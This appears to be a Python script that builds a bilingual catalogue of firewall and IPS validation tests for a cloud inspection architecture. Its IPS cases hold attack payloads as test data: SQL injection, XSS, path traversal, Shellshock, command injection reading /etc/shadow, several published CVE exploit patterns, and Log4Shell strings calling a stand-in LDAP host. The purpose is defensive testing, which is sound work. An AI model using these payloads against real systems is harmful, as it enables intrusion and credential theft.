#!/usr/bin/env python3
"""Builds catalog/tests.json — the single source of truth for the portal, the client runner and the Word report.

Every text is bilingual: {"en": ..., "es": ...}.
Check fields:
  type        http | tcp | icmp | dns | ntp | quic | egress_ip | tls_issuer | tls_verify | echo_ip | segmented |
              tcp_hold | nmap | pmtu | banner | dns_fail | https_bench | segmatrix
  expect      ALLOW | BLOCK | INSPECTED | NOT_INSPECTED | VALID | INVALID | PRESERVED | LIMITED | MEASURE | NO_FLOW | MATRIX
  roles       run only from clients whose environment has one of these roles (see config)
  skip_roles  do not run from clients with these roles
  needs       config keys that must be set (otherwise the check is skipped as "not configured")
Placeholders resolved at run time from the portal configuration:
  {SERVER}          IP of the test server               {ENV:<role>}  IP of the environment assigned to <role>
  {NET:<key>}       Internet target from config.internet  {PEER}      cross-AZ peer of this client
  {RESOLVE:<fqdn>}  IP of <fqdn> resolved by the client

Usage: python3 catalog.py [output=tests.json]
"""
import json, os, sys

OUT = sys.argv[1] if len(sys.argv) > 1 else os.path.join(os.path.dirname(os.path.abspath(__file__)), "tests.json")


def T(es, en):
    return {"es": es, "en": en}


DOMAINS = [
    ("NET", T("Arquitectura y enrutamiento", "Architecture and routing")),
    ("POL", T("Políticas y segmentación", "Policy and segmentation")),
    ("IPS", T("Prevención de intrusiones", "Intrusion prevention")),
    ("THR", T("Malware y amenazas", "Malware and threats")),
    ("TLS", T("Inspección y cifrado TLS", "TLS inspection")),
    ("APP", T("Control L7 y anomalías", "L7 control and anomalies")),
    ("DLP", T("Prevención de fuga de datos", "Data loss prevention")),
    ("WAF", T("Protección web complementaria", "Complementary web protection")),
]

S = "{SERVER}"
INS, NOD, MTLS = "inspect.testkit.lab", "nodecrypt.testkit.lab", "mtls.testkit.lab"
R_INS = ["--resolve", f"{INS}:443:{S}"]
R_NOD = ["--resolve", f"{NOD}:443:{S}"]
R_MTLS = ["--resolve", f"{MTLS}:443:{S}"]
SRV = dict(skip_if_server=True)
SQLI = "/index.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--"
XSS = "/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
AB_URL = "{NET:c2_test_url}"   # vendor test URL for C&C detection (configurable: each vendor has its own)


def http(name, expect, url, args=None, explain=None, blade="", **kw):
    return dict(name=name, type="http", url=url, args=args or [], expect=expect, explain=explain or T("", ""), blade=blade, **kw)


def tcp(name, expect, host, port, explain, blade="Firewall", **kw):
    return dict(name=name, type="tcp", host=host, port=port, expect=expect, explain=explain, blade=blade, **kw)


def chk(type_, name, expect, explain, blade="", **kw):
    return dict(name=name, type=type_, expect=expect, explain=explain, blade=blade, **kw)


E_IPS = T("Petición HTTP al servidor de pruebas con un patrón de ataque conocido: el IPS en Prevent debe cortar la conexión.",
          "HTTP request to the test server carrying a well-known attack pattern: IPS in Prevent must drop the connection.")
E_TLS = T("Petición HTTPS al servidor con SNI inspect.testkit.lab: HTTPS Inspection descifra y los blades inspeccionan el contenido.",
          "HTTPS request to the server with SNI inspect.testkit.lab: HTTPS Inspection decrypts and the blades inspect the content.")
E_CTRL = T("Control: tráfico legítimo, no debe bloquearse.", "Control: legitimate traffic, must not be blocked.")
SEG_EXPL = T("Matriz de segmentación configurada: desde este entorno hacia los demás se prueban ICMP, HTTP, HTTPS, SSH, RDP, tcp/8080 e iperf3, y se compara con lo permitido.",
             "Configured segmentation matrix: from this environment to the others it tests ICMP, HTTP, HTTPS, SSH, RDP, tcp/8080 and iperf3 and compares with what is allowed.")

C = []


def case(id_, prio, title, objective, how, requires, evidence, checks):
    C.append(dict(id=id_, domain=id_.split("-")[0], priority=prio, title=title, objective=objective, how=how,
                  requires=requires, evidence=evidence, checks=checks))


EVI_STD = T("Resultados del portal (Word/CSV) y registros del firewall filtrados por IP de origen y hora.",
            "Portal results (Word/CSV) and firewall logs filtered by source IP and time.")

# ------------------------------------------------------------------ NET
case("NET-01", "critical", T("Inspección este-oeste entre VPC", "East-west inspection between VPCs"),
     T("Los flujos entre entornos atraviesan el firewall en ambos sentidos y se permiten o deniegan según la matriz.", "Traffic between environments crosses the firewall in both directions and is allowed or denied according to the matrix."),
     T("El tráfico entre VPC pasa por el Transit Gateway hacia la VPC de inspección (GWLBe) y el Gateway Load Balancer lo entrega a Check Point Cloud Firewall. Cada decisión queda registrada con la regla que la tomó.",
       "Traffic between VPCs goes through the Transit Gateway to the inspection VPC (GWLBe) and the Gateway Load Balancer hands it to Check Point Cloud Firewall. Every decision is logged with the rule that made it."),
     T("Regla que permite ICMP, HTTP y HTTPS hacia el entorno del servidor y deniega el resto.", "Rule allowing ICMP, HTTP and HTTPS to the server environment and denying everything else."),
     EVI_STD, [
         chk("icmp", T("ICMP echo al servidor", "ICMP echo to the server"), "ALLOW", T("Ping desde la IP de workload.", "Ping from the workload IP."), "Firewall", host=S, **SRV),
         tcp(T("HTTP tcp/80 al servidor", "HTTP tcp/80 to the server"), "ALLOW", S, 80, T("Servicio publicado.", "Published service."), **SRV),
         tcp(T("HTTPS tcp/443 al servidor", "HTTPS tcp/443 to the server"), "ALLOW", S, 443, T("Servicio publicado e inspeccionado.", "Published and inspected service."), **SRV),
         tcp(T("SSH tcp/22 al servidor", "SSH tcp/22 to the server"), "BLOCK", S, 22, T("El servidor escucha, pero la política no lo permite.", "The server listens, but the policy does not allow it."), **SRV),
         tcp(T("Telnet tcp/23 al servidor", "Telnet tcp/23 to the server"), "BLOCK", S, 23, T("Protocolo inseguro con servicio a la escucha.", "Insecure protocol with a listening service."), **SRV),
         tcp(T("tcp/8080 al servidor", "tcp/8080 to the server"), "BLOCK", S, 8080, T("HTTP alternativo no autorizado.", "Unauthorized alternate HTTP."), **SRV),
         tcp(T("RDP tcp/3389 al servidor", "RDP tcp/3389 to the server"), "BLOCK", S, 3389, T("Administración remota no autorizada.", "Unauthorized remote administration."), **SRV),
     ])
case("NET-03", "critical", T("Salida norte-sur a Internet", "North-south egress to the Internet"),
     T("La salida a Internet se inspecciona de forma centralizada; solo pasa lo previsto.", "Internet egress is inspected centrally; only the expected traffic passes."),
     T("Salida centralizada (spoke → TGW → inspección → VPC de salida con NAT Gateway). En el firewall, una capa en línea permite HTTP/HTTPS (con firma de protocolo) y DNS, y deniega el resto.",
       "Centralized egress (spoke → TGW → inspection → egress VPC with NAT Gateway). On the firewall an inline layer allows HTTP/HTTPS (protocol signature) and DNS and denies the rest."),
     T("Capa de salida que permite solo HTTP, HTTPS y DNS.", "Egress layer allowing only HTTP, HTTPS and DNS."), EVI_STD, [
         http(T("HTTP a Internet", "HTTP to the Internet"), "ALLOW", "http://{NET:allowed_site}/", explain=E_CTRL, blade="Firewall"),
         http(T("HTTPS a Internet", "HTTPS to the Internet"), "ALLOW", "https://{NET:allowed_site}/", explain=E_CTRL, blade="Firewall / HTTPSi"),
         chk("dns", T("DNS UDP a resolvedor público", "DNS UDP to a public resolver"), "ALLOW", T("Consulta DNS directa: servicio permitido.", "Direct DNS query: allowed service."), "Firewall", server="{NET:dns_resolver}", qname="{NET:allowed_site}"),
         tcp(T("SMTP tcp/25 a Internet", "SMTP tcp/25 to the Internet"), "BLOCK", "{NET:port_test_host}", 25, T("Puerto no web hacia Internet.", "Non-web port to the Internet.")),
         chk("ntp", T("NTP UDP/123 a Internet", "NTP UDP/123 to the Internet"), "BLOCK", T("UDP distinto de DNS no está permitido.", "UDP other than DNS is not allowed."), "Firewall", host="pool.ntp.org"),
         chk("egress_ip", T("IP pública de salida", "Public egress IP"), "ALLOW", T("Muestra la IP pública con la que se sale (NAT centralizado).", "Shows the public egress IP (centralized NAT)."), "Architecture"),
     ])
case("NET-05", "critical", T("Simetría de enrutamiento stateful entre AZ", "Stateful routing symmetry across AZs"),
     T("Ida y vuelta de un flujo entre AZ distintas llegan al mismo contexto stateful.", "Both directions of a cross-AZ flow reach the same stateful context."),
     T("Con el attachment de inspección en appliance mode, ambos sentidos usan el mismo GWLBe y el GWLB los entrega al mismo gateway; la sesión no se rompe.",
       "With the inspection attachment in appliance mode both directions use the same GWLBe and the GWLB delivers them to the same gateway; the session is not broken."),
     T("Pares de entornos en AZ distintas (configuración) con HTTP permitido entre ellos.", "Environment pairs in different AZs (configuration) with HTTP allowed between them."), EVI_STD, [
         chk("tcp_hold", T("Sesión TCP de 20 s con el par de otra AZ", "20 s TCP session with the cross-AZ peer"), "ALLOW",
             T("Conexión HTTP persistente con 10 peticiones en 20 s: con asimetría, el firewall descartaría la vuelta.", "Persistent HTTP connection with 10 requests in 20 s: with asymmetry the firewall would drop the return traffic."), "Architecture", host="{PEER}", port=80, needs=["peer"]),
     ])
case("NET-07", "critical", T("Segmentación entre producción y no producción", "Production vs non-production segmentation"),
     T("No hay tráfico entre producción y no producción salvo las excepciones aprobadas.", "No traffic between production and non-production except approved exceptions."),
     T("Los entornos se definen por CIDR y reglas explícitas bloquean producción ↔ no producción en ambos sentidos.", "Environments are defined by CIDR and explicit rules block production ↔ non-production in both directions."),
     T("Roles prod_envs y nonprod_envs y la matriz de segmentación.", "prod_envs and nonprod_envs roles and the segmentation matrix."), EVI_STD, [
         chk("segmatrix", T("Matriz producción ↔ no producción", "Production ↔ non-production matrix"), "MATRIX", SEG_EXPL, "Firewall", scope="prod_nonprod"),
     ])
case("NET-13", "high", T("MTU, fragmentación y GENEVE", "MTU, fragmentation and GENEVE"),
     T("No hay agujeros negros por MTU; el tamaño máximo útil queda medido.", "No MTU black holes; the maximum usable size is measured."),
     T("GWLB encapsula en GENEVE y admite MTU de 8.500 bytes. Se mide el mayor paquete que pasa sin fragmentar.", "GWLB encapsulates in GENEVE and supports an 8,500-byte MTU. The largest unfragmented packet is measured."),
     T("ICMP permitido hacia el servidor.", "ICMP allowed to the server."), EVI_STD, [
         chk("pmtu", T("MTU efectiva hacia el servidor", "Effective MTU to the server"), "MEASURE", T("Ping con DF de 1.472 a 8.472 bytes. Criterio: ≥ 1.472.", "DF ping from 1,472 to 8,472 bytes. Criterion: ≥ 1,472."), "Architecture", host=S, **SRV),
     ])

# ------------------------------------------------------------------ POL
case("POL-01", "critical", T("Allow/deny stateful y denegación por defecto", "Stateful allow/deny and default deny"),
     T("Solo pasan las 5-tuplas autorizadas; el resto se descarta y se registra.", "Only authorized 5-tuples pass; everything else is dropped and logged."),
     T("Política stateful con lista blanca y regla de limpieza final (Drop + Log).", "Stateful allow-list policy with a final cleanup rule (Drop + Log)."),
     T("Lista blanca hacia el servidor y cleanup.", "Allow-list to the server and cleanup rule."), EVI_STD, [
         tcp(T("tcp/80 autorizado", "Authorized tcp/80"), "ALLOW", S, 80, T("5-tupla autorizada.", "Authorized 5-tuple."), **SRV),
         tcp(T("tcp/443 autorizado", "Authorized tcp/443"), "ALLOW", S, 443, T("5-tupla autorizada.", "Authorized 5-tuple."), **SRV),
         tcp(T("tcp/22 no autorizado", "Unauthorized tcp/22"), "BLOCK", S, 22, T("Mismo origen y destino, puerto no autorizado.", "Same source and destination, unauthorized port."), **SRV),
         tcp(T("tcp/5202 no autorizado", "Unauthorized tcp/5202"), "BLOCK", S, 5202, T("Puerto contiguo a una excepción.", "Port next to an exception."), **SRV),
     ])
case("POL-02", "critical", T("Excepciones granulares por 5-tupla", "Granular 5-tuple exceptions"),
     T("Una excepción solo abre el flujo indicado; puertos vecinos siguen bloqueados.", "An exception opens only the given flow; neighbouring ports stay blocked."),
     T("Regla de excepción para un único puerto (por defecto iperf3 tcp/5201) entre entornos.", "Exception rule for a single port (iperf3 tcp/5201 by default) between environments."),
     T("Regla que permita solo el puerto de excepción configurado.", "Rule allowing only the configured exception port."), EVI_STD, [
         tcp(T("Puerto exceptuado", "Excepted port"), "ALLOW", S, "{NET:exception_port}", T("Flujo exceptuado.", "Excepted flow."), **SRV),
         tcp(T("Puerto vecino inferior", "Lower neighbouring port"), "BLOCK", S, "{NET:exception_port-1}", T("No debe quedar abierto.", "Must not be open."), **SRV),
         tcp(T("Puerto vecino superior", "Upper neighbouring port"), "BLOCK", S, "{NET:exception_port+1}", T("No debe quedar abierto.", "Must not be open."), **SRV),
     ])
case("POL-05", "critical", T("Reglas por FQDN", "FQDN rules"),
     T("La decisión se toma por el dominio, no por la IP.", "The decision is made by domain, not by IP."),
     T("Sitio personalizado de URL Filtering: se decide por Host (HTTP) y SNI/certificado (HTTPS). Por defecto www.example.org (bloqueado) y www.example.com (permitido) comparten IP.",
       "URL Filtering custom site: decided by Host (HTTP) and SNI/certificate (HTTPS). By default www.example.org (blocked) and www.example.com (allowed) share the same IP."),
     T("Sitio personalizado con el FQDN bloqueado configurado.", "Custom site with the configured blocked FQDN."), EVI_STD, [
         http(T("FQDN permitido", "Allowed FQDN"), "ALLOW", "http://{NET:allowed_site}/", explain=E_CTRL, blade="URL Filtering"),
         http(T("FQDN bloqueado (HTTP)", "Blocked FQDN (HTTP)"), "BLOCK", "http://{NET:blocked_fqdn}/", explain=T("Mismo hosting e IP: solo se bloquea si la decisión es por nombre.", "Same hosting and IP: blocked only if the decision is by name."), blade="URL Filtering", needs=["internet.blocked_fqdn"]),
         http(T("FQDN bloqueado (HTTPS)", "Blocked FQDN (HTTPS)"), "BLOCK", "https://{NET:blocked_fqdn}/", explain=T("En HTTPS se decide por SNI/certificado.", "Over HTTPS the decision uses SNI/certificate."), blade="URL Filtering / HTTPSi", needs=["internet.blocked_fqdn"]),
     ])
case("POL-07", "critical", T("Fallos de DNS", "DNS failures"),
     T("Un fallo de resolución no abre conectividad.", "A resolution failure never opens connectivity."),
     T("Sin resolución no hay flujo y la política sigue en denegación por defecto.", "Without resolution there is no flow and the policy stays default-deny."),
     T("Ninguno.", "None."), EVI_STD, [
         chk("dns_fail", T("Nombre inexistente (NXDOMAIN)", "Non-existent name (NXDOMAIN)"), "NO_FLOW", T("curl a un nombre .invalid.", "curl to a .invalid name."), "Firewall"),
     ])
case("POL-10", "critical", T("Precedencia de reglas", "Rule precedence"),
     T("El orden de evaluación es determinista y la regla efectiva queda registrada.", "Evaluation order is deterministic and the matching rule is logged."),
     T("La política se evalúa de arriba abajo: una regla de excepción por encima de la de segmentación gana para su servicio; el resto lo decide la segmentación.",
       "The rulebase is evaluated top-down: an exception rule above the segmentation rule wins for its service; the rest is decided by segmentation."),
     T("Roles precedence_clients y precedence_target, y la regla de excepción por encima de la de bloqueo.", "precedence_clients and precedence_target roles, and the exception rule above the blocking rule."), EVI_STD, [
         tcp(T("Servicio exceptuado hacia el destino bloqueado", "Excepted service to the blocked target"), "ALLOW", "{ENV:precedence_target}", "{NET:exception_port}", T("La regla de excepción está antes que la de bloqueo.", "The exception rule is above the blocking rule."), roles=["precedence_clients"], needs=["roles.precedence_target"]),
         tcp(T("HTTP hacia el destino bloqueado", "HTTP to the blocked target"), "BLOCK", "{ENV:precedence_target}", 80, T("Sin regla previa que lo permita, decide la de bloqueo.", "No earlier rule allows it, so the blocking rule decides."), roles=["precedence_clients"], needs=["roles.precedence_target"]),
     ])
case("POL-11", "critical", T("Microsegmentación por servicio y entorno", "Micro-segmentation by service and environment"),
     T("No hay movimiento lateral fuera de la matriz aprobada.", "No lateral movement outside the approved matrix."),
     T("Se ejecuta la matriz completa desde cada entorno (en lote sobre todos los clientes).", "The full matrix is run from every environment (batch over all clients)."),
     T("Matriz de segmentación en la configuración.", "Segmentation matrix in the configuration."), EVI_STD, [
         chk("segmatrix", T("Matriz completa de entornos", "Full environment matrix"), "MATRIX", SEG_EXPL, "Firewall", scope="all"),
     ])
case("POL-12", "high", T("Perfiles combinados", "Combined profiles"),
     T("Varios controles en el mismo flujo, cada uno con su traza.", "Several controls on the same flow, each one traceable."),
     T("En la salida a Internet se combinan Firewall, App Control, URL Filtering, IPS, Anti-Bot y Anti-Virus; el registro indica qué blade actuó.",
       "Internet egress combines Firewall, App Control, URL Filtering, IPS, Anti-Bot and Anti-Virus; the log shows which blade acted."),
     T("Perfil completo en la regla de salida y HTTPS Inspection.", "Full profile on the egress rule and HTTPS Inspection."), EVI_STD, [
         http(T("EICAR desde Internet por HTTPS", "EICAR from the Internet over HTTPS"), "BLOCK", "https://secure.eicar.org/eicar.com.txt", explain=T("Anti-Virus sobre HTTPS descifrado.", "Anti-Virus on decrypted HTTPS."), blade="Anti-Virus / HTTPSi"),
         http(T("Página de prueba de Anti-Bot", "Anti-Bot test page"), "BLOCK", AB_URL, explain=T("Reputación de C&C.", "C&C reputation."), blade="Anti-Bot"),
         http(T("Categoría Gambling", "Gambling category"), "BLOCK", "http://www.bet365.com/", explain=T("URL Filtering por categoría.", "URL Filtering by category."), blade="URL Filtering", warmup=True),
         http(T("Sitio legítimo", "Legitimate site"), "ALLOW", "https://{NET:allowed_business_site}/", explain=E_CTRL, blade="All"),
     ])
case("POL-15", "high", T("Modo detección frente a prevención", "Detect vs prevent mode"),
     T("El mismo estímulo solo se detecta en un destino y se bloquea en otro.", "The same stimulus is only detected on one target and blocked on another."),
     T("Regla de Threat Prevention con perfil Detect hacia el entorno ids_target y perfil Prevent hacia el servidor.", "Threat Prevention rule with a Detect profile towards the ids_target environment and a Prevent profile towards the server."),
     T("Roles ids_target e ids_clients; regla TP con perfil Detect hacia ids_target; HTTP permitido desde ids_clients.", "ids_target and ids_clients roles; TP rule with a Detect profile to ids_target; HTTP allowed from ids_clients."), EVI_STD, [
         http(T("SQLi hacia el destino en Detect", "SQLi to the Detect target"), "ALLOW", "http://{ENV:ids_target}" + SQLI, explain=T("Llega al servidor y queda registrado como Detect.", "Reaches the server and is logged as Detect."), blade="IPS", roles=["ids_clients"], needs=["roles.ids_target"]),
         http(T("SQLi hacia el servidor en Prevent", "SQLi to the Prevent server"), "BLOCK", "http://" + S + SQLI, explain=T("Bloqueado y registrado como Prevent.", "Blocked and logged as Prevent."), blade="IPS", roles=["ids_clients"], needs=["roles.ids_target"]),
     ])

# ------------------------------------------------------------------ IPS
case("IPS-01", "critical", T("Bloqueo de ataques conocidos", "Known attack prevention"),
     T("Las firmas detectan y bloquean; el registro incluye protección, severidad y acción.", "Signatures detect and block; the log includes protection, severity and action."),
     T("IPS en Prevent en todo el tráfico entre entornos y hacia Internet.", "IPS in Prevent for all east-west and Internet traffic."),
     T("Perfil de Threat Prevention con IPS en Prevent en la regla este-oeste.", "Threat Prevention profile with IPS in Prevent on the east-west rule."), EVI_STD, [
         http(T("Petición limpia (control)", "Clean request (control)"), "ALLOW", "http://" + S + "/", explain=E_CTRL, blade="IPS", **SRV),
         http(T("SQL injection (UNION SELECT)", "SQL injection (UNION SELECT)"), "BLOCK", "http://" + S + SQLI, explain=E_IPS, blade="IPS", **SRV),
         http(T("Cross-site scripting", "Cross-site scripting"), "BLOCK", "http://" + S + "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", explain=E_IPS, blade="IPS", **SRV),
         http(T("Path traversal", "Path traversal"), "BLOCK", "http://" + S + "/../../../../etc/passwd", ["--path-as-is"], explain=E_IPS, blade="IPS", **SRV),
         http(T("Path traversal en parámetro", "Path traversal in parameter"), "BLOCK", "http://" + S + "/download.php?file=../../../../etc/passwd", explain=E_IPS, blade="IPS", **SRV),
         http(T("Shellshock (User-Agent)", "Shellshock (User-Agent)"), "BLOCK", "http://" + S + "/cgi-bin/status", ["-A", '() { :; }; /bin/bash -c "cat /etc/passwd"'], explain=E_IPS, blade="IPS", **SRV),
         http(T("Log4Shell (cabecera JNDI)", "Log4Shell (JNDI header)"), "BLOCK", "http://" + S + "/", ["-H", "X-Api-Version: ${jndi:ldap://198.51.100.7:1389/a}"], explain=E_IPS, blade="IPS", **SRV),
         http(T("Inyección de comandos", "Command injection"), "BLOCK", "http://" + S + "/cgi-bin/ping.cgi?host=127.0.0.1;cat%20/etc/shadow", explain=E_IPS, blade="IPS", **SRV),
     ])
case("IPS-02", "high", T("Escaneo y reconocimiento", "Scanning and reconnaissance"),
     T("Un escaneo solo ve los servicios autorizados.", "A scan only sees authorized services."),
     T("El firewall descarta los puertos no autorizados aunque el servidor escuche; los intentos quedan registrados.", "The firewall drops unauthorized ports even if the server listens; attempts are logged."),
     T("Solo 80, 443 y el puerto de excepción permitidos hacia el servidor.", "Only 80, 443 and the exception port allowed to the server."), EVI_STD, [
         chk("nmap", T("Escaneo de puertos al servidor", "Port scan of the server"), "LIMITED", T("nmap sobre 1-1024, 3389, 5201 y 8080: solo deben verse los autorizados.", "nmap over 1-1024, 3389, 5201 and 8080: only authorized ports must be visible."), "Firewall / IPS", host=S, allowed=[80, 443, "{NET:exception_port}"], **SRV),
     ])
TPL = "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)"
case("IPS-04", "critical", T("Excepción de firma por activo", "Per-asset signature exception"),
     T("Solo queda exceptuada la combinación autorizada; el resto sigue protegido.", "Only the authorized combination is excepted; everything else stays protected."),
     T("Excepción de Threat Prevention con una sola protección (TP-Link Archer AX21, CVE-2023-1389), origen ips_exception_client y destino el servidor, en Detect.",
       "Threat Prevention exception with a single protection (TP-Link Archer AX21, CVE-2023-1389), source ips_exception_client and the server as destination, in Detect."),
     T("Excepción en la regla este-oeste: protección «TP-Link Archer AX21 Command Injection (CVE-2023-1389)», origen = entorno ips_exception_client, acción Detect.",
       "Exception on the east-west rule: protection 'TP-Link Archer AX21 Command Injection (CVE-2023-1389)', source = ips_exception_client environment, action Detect."), EVI_STD, [
         http(T("CVE-2023-1389 desde el activo exceptuado", "CVE-2023-1389 from the excepted asset"), "ALLOW", "http://" + S + TPL, explain=T("Dentro del alcance: Detect.", "In scope: Detect."), blade="IPS", roles=["ips_exception_client"], needs=["roles.ips_exception_client"]),
         http(T("CVE-2023-1389 desde otro activo", "CVE-2023-1389 from another asset"), "BLOCK", "http://" + S + TPL, explain=T("Fuera del alcance: sigue bloqueado.", "Out of scope: still blocked."), blade="IPS", skip_roles=["ips_exception_client"], needs=["roles.ips_exception_client"], **SRV),
         http(T("Otra protección desde el activo exceptuado", "Another protection from the excepted asset"), "BLOCK", "http://" + S + SQLI, explain=T("El resto de protecciones siguen activas.", "All other protections stay active."), blade="IPS", roles=["ips_exception_client"], needs=["roles.ips_exception_client"]),
     ])
case("IPS-05", "high", T("Falsos positivos", "False positives"),
     T("Tráfico legítimo parecido a firmas no se bloquea.", "Legitimate traffic resembling signatures is not blocked."),
     T("Perfiles por confianza e impacto; el ajuste fino se hace con excepciones por activo, sin desactivar detecciones globalmente.", "Profiles by confidence and impact; fine tuning uses per-asset exceptions without disabling detections globally."),
     T("Ninguno.", "None."), EVI_STD, [
         http(T("Texto con 'select' y 'union'", "Text with 'select' and 'union'"), "ALLOW", "http://" + S + "/search?q=how+to+select+the+best+union+representative", explain=E_CTRL, blade="IPS", **SRV),
         http(T("Apellido con apóstrofo", "Surname with apostrophe"), "ALLOW", "http://" + S + "/profile?name=O%27Brien", explain=E_CTRL, blade="IPS", **SRV),
         http(T("Filtro con comparadores", "Filter with comparators"), "ALLOW", "http://" + S + "/api/items?filter=price%3E100%20and%20price%3C200", explain=E_CTRL, blade="IPS", **SRV),
         http(T("JSON con HTML legítimo", "JSON with legitimate HTML"), "ALLOW", "http://" + S + "/api/notes", ["-H", "Content-Type: application/json", "--data", '{"title":"Note","body":"Text in <b>bold</b> and <i>italics</i>"}'], explain=E_CTRL, blade="IPS", **SRV),
         http(T("Script de shell legítimo", "Legitimate shell script"), "ALLOW", "http://" + S + "/demo/benign.sh", explain=E_CTRL, blade="IPS / AV", **SRV),
     ])
CVE = [
    ("CVE-2021-41773 Apache path traversal", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", ["--path-as-is"]),
    ("CVE-2022-22965 Spring4Shell", "/app/greeting", ["--data", "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"]),
    ("CVE-2022-26134 Confluence OGNL", "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/", []),
    ("CVE-2017-9841 PHPUnit eval-stdin", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", ["--data", '<?php echo md5("testkit"); ?>']),
    ("CVE-2019-19781 Citrix ADC traversal", "/vpn/../vpns/cfg/smb.conf", ["--path-as-is"]),
    ("CVE-2022-1388 F5 BIG-IP iControl", "/mgmt/tm/util/bash", ["-H", "X-F5-Auth-Token: a", "-H", "Connection: X-F5-Auth-Token", "-H", "Authorization: Basic YWRtaW46", "-H", "Content-Type: application/json", "--data", '{"command":"run","utilCmdArgs":"-c id"}']),
    ("CVE-2021-44228 Log4Shell User-Agent", "/", ["-A", "${jndi:ldap://198.51.100.7:1389/Exploit}"]),
]
case("IPS-06", "high", T("Parcheo virtual de CVE publicadas", "Virtual patching of published CVEs"),
     T("Se bloquean patrones de explotación sin tocar el servidor.", "Exploitation patterns are blocked without touching the server."),
     T("El IPS bloquea la explotación de CVE conocidas; el servidor de pruebas no es vulnerable, solo recibe el patrón.", "IPS blocks exploitation of known CVEs; the test server is not vulnerable, it only receives the pattern."),
     T("IPS en Prevent.", "IPS in Prevent."), EVI_STD,
     [http(T(n, n), "BLOCK", "http://" + S + u, a, explain=E_IPS, blade="IPS", **SRV) for n, u, a in CVE])
case("IPS-07", "high", T("Evasiones y fragmentación", "Evasions and fragmentation"),
     T("Las variantes ofuscadas y troceadas se detectan igual que el ataque original.", "Obfuscated and segmented variants are detected like the original attack."),
     T("El IPS reensambla el flujo TCP y normaliza la codificación antes de buscar patrones.", "IPS reassembles the TCP stream and normalizes encoding before pattern matching."),
     T("IPS en Prevent.", "IPS in Prevent."), EVI_STD, [
         http(T("SQLi mayúsculas/minúsculas", "SQLi mixed case"), "BLOCK", "http://" + S + "/index.php?id=1%27%20UnIoN%20SeLeCt%20username,password%20FrOm%20users--", explain=E_IPS, blade="IPS", **SRV),
         http(T("SQLi con comentarios en línea", "SQLi with inline comments"), "BLOCK", "http://" + S + "/index.php?id=1%27/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--", explain=E_IPS, blade="IPS", **SRV),
         http(T("SQLi UNION en cuerpo POST", "SQLi UNION in POST body"), "BLOCK", "http://" + S + "/login.php", ["--data", "id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--"], explain=E_IPS, blade="IPS", **SRV),
         http(T("Traversal con doble codificación", "Double-encoded traversal"), "BLOCK", "http://" + S + "/download.php?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd", explain=E_IPS, blade="IPS", **SRV),
         http(T("XSS en cabecera Referer", "XSS in Referer header"), "BLOCK", "http://" + S + "/", ["-H", "Referer: http://x/<script>alert(1)</script>"], explain=E_IPS, blade="IPS", **SRV),
         http(T("Log4Shell ofuscado", "Obfuscated Log4Shell"), "BLOCK", "http://" + S + "/", ["-H", "X-Api-Version: ${${lower:j}ndi:${lower:l}dap://198.51.100.7/a}"], explain=E_IPS, blade="IPS", **SRV),
         chk("segmented", T("SQLi troceada en segmentos TCP de 4 bytes", "SQLi split into 4-byte TCP segments"), "BLOCK", T("El IPS debe reensamblar el flujo antes de inspeccionar.", "IPS must reassemble the stream before inspecting."), "IPS", host=S, port=80,
             payload="GET " + SQLI + " HTTP/1.1\r\nHost: testkit\r\nConnection: close\r\n\r\n", chunk=4, **SRV),
         chk("segmented", T("Control: petición limpia troceada", "Control: clean segmented request"), "ALLOW", E_CTRL, "IPS", host=S, port=80,
             payload="GET /index.html HTTP/1.1\r\nHost: testkit\r\nConnection: close\r\n\r\n", chunk=4, **SRV),
     ])
case("IPS-08", "high", T("Geobloqueo", "Geo-blocking"),
     T("Los destinos de países bloqueados se descartan.", "Destinations in blocked countries are dropped."),
     T("Objetos actualizables GEO en la capa de salida.", "GEO updatable objects in the egress layer."),
     T("Regla de salida con los países bloqueados y una URL de prueba de uno de ellos (config.internet.geo_blocked_url).", "Egress rule with the blocked countries and a test URL in one of them (config.internet.geo_blocked_url)."), EVI_STD, [
         http(T("Destino en país bloqueado", "Destination in a blocked country"), "BLOCK", "{NET:geo_blocked_url}", explain=T("IP de destino en un país bloqueado.", "Destination IP in a blocked country."), blade="Firewall (GEO)", needs=["internet.geo_blocked_url"]),
         http(T("Destino en país permitido", "Destination in an allowed country"), "ALLOW", "http://{NET:allowed_business_site}/", explain=E_CTRL, blade="Firewall (GEO)"),
     ])
case("IPS-09", "high", T("C&C y botnets", "C&C and botnets"),
     T("El tráfico hacia indicadores de C&C se bloquea.", "Traffic to C&C indicators is blocked."),
     T("Anti-Bot bloquea por reputación de dominio, IP y URL (ThreatCloud) y por patrones de comunicación.", "Anti-Bot blocks by domain, IP and URL reputation (ThreatCloud) and by communication patterns."),
     T("Anti-Bot en el perfil de salida.", "Anti-Bot in the egress profile."), EVI_STD, [
         http(T("URL de prueba de C&C del fabricante", "Vendor C&C test URL"), "BLOCK", AB_URL, explain=T("URL de prueba que el fabricante clasifica como C&C (configurable en Destinos en Internet).", "Test URL the vendor classifies as C&C (configurable in Internet targets)."), blade="Anti-Bot"),
         http(T("Control: sitio corporativo permitido", "Control: allowed business site"), "ALLOW", "http://{NET:allowed_business_site}/", explain=E_CTRL, blade="Anti-Bot"),
     ])
case("IPS-11", "high", T("Política diferenciada IDS frente a IPS", "IDS vs IPS differentiated policy"),
     T("El modo detección no bloquea; el de prevención sí; ambos registran.", "Detect mode does not block; prevent mode does; both log."),
     T("Mismo estímulo contra el destino en Detect (ids_target) y contra el servidor en Prevent.", "Same stimulus against the Detect target (ids_target) and the Prevent server."),
     T("Igual que POL-15.", "Same as POL-15."), EVI_STD, [
         http(T("XSS hacia el destino IDS", "XSS to the IDS target"), "ALLOW", "http://{ENV:ids_target}" + XSS, explain=T("Perfil Detect.", "Detect profile."), blade="IPS", roles=["ids_clients"], needs=["roles.ids_target"]),
